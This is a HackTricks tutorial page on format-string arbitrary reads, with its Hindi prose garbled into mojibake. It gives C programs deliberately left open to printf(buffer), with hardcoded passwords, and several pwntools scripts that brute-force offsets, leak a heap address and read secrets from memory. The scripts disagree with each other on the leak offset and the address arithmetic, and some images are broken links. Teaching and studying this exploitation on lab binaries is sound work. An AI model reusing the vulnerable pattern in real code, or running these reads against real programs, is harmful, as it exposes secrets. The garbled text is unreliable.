# Format Strings - Arbitrary Read Example

{% hint style="success" %}
рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рдЬреАрд╕реАрдкреА рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдЬреАрд╕реАрдкреА рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## Read Binary Start

### Code
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### рд╢рд╛рддреНрд░реБрддрд╛
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **рдУрдлрд╝рд╕реЗрдЯ 11 рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдПрдПрд╕ рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ **рд▓реВрдк рдХреЗ рд╕рд╛рде рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ** рдХрд░рдиреЗ рд╕реЗ 0 рд╕реЗ 50 рддрдХ рдХреЗ рдСрдлрд╕реЗрдЯ рдкрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдСрдлрд╕реЗрдЯ 11 рдкрд░ рдФрд░ 5 рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдг (рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдкрд╛рдЗрдк `|`) рдХреЗ рд╕рд╛рде, рдкреВрд░рд╛ рдкрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдореИрдВрдиреЗ **`%11$p`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреИрдбрд┐рдВрдЧ рдХрд┐рдпрд╛ рддрд╛рдХрд┐ рдореБрдЭреЗ рдпрд╣ рдкрддрд╛ рдЪрд▓реЗ рдХрд┐ рдкрддрд╛ рд╕рднреА 0x4141414141414141 рд╣реИ
* **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреЗрд▓реЛрдб рдкрддреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ **printf рдирд▓ рдмрд╛рдЗрдЯ рдкрд░ рдкрдврд╝рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдо рдкрддрд╛ рдФрд░ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ printf рдХрднреА рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рддрдХ рдирд╣реАрдВ рдкрд╣реБрдВрдЪреЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рдкрд╣рд▓реЗ рдорд┐рд▓ рдЬрд╛рдПрдЧрд╛ред
* рдЪрдпрдирд┐рдд рдкрддрд╛ 0x00400000 рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдмрд╛рдЗрдирд░реА рдХреА рд╢реБрд░реБрдЖрдд рд╣реИ (рдХреЛрдИ PIE рдирд╣реАрдВ)
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### рд╕реНрдЯреИрдХ рд╕реЗ рдкрдврд╝реЗрдВ

**`stack_password`** рд╕реНрдЯреИрдХ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдЪрд░ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕рд┐рд░реНрдл printf рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдЯреИрдХ рдХреА рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрд╛рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред рдпрд╣ рд╕реНрдЯреИрдХ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ 100 рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рднрд░рдиреЗ рдХрд╛ рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
рдЪрд┐рддреНрд░ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╣рдо рд╕реНрдЯреИрдХ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ `10рд╡реЗрдВ` рд╕реНрдерд╛рди рд╕реЗ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### рдбреЗрдЯрд╛ рдкрдврд╝реЗрдВ

рд╕рдорд╛рди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЪрд▓рд╛рдиреЗ рдкрд░, рд▓реЗрдХрд┐рди `%s` рдХреА рдмрдЬрд╛рдп `%p` рдХреЗ рд╕рд╛рде, рд╣рдореЗрдВ рд╕реНрдЯреИрдХ рд╕реЗ рд╣реАрдк рдкрддрд╛ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ `%25$p` рдкрд░ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд▓реАрдХ рд╣реБрдП рдкрддреЗ (`0xaaaab7030894`) рдХреА рддреБрд▓рдирд╛ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕реНрдерд╛рди рдХреЗ рд╕рд╛рде рд╣рдо рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

рдЕрдм рд╕рдордп рд╣реИ рдХрд┐ рд╣рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ 1 рдкрддреЗ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдо рджреВрд╕рд░реЗ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рд╕реЗ рдЙрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВ:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
рдФрд░ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **try 14** рдореЗрдВ рд╣рдо рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдкрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### рд╢рд┐рдХрд╛рд░
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ GCP рд╣реИрдХрд┐рдВрдЧ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
{% endhint %}
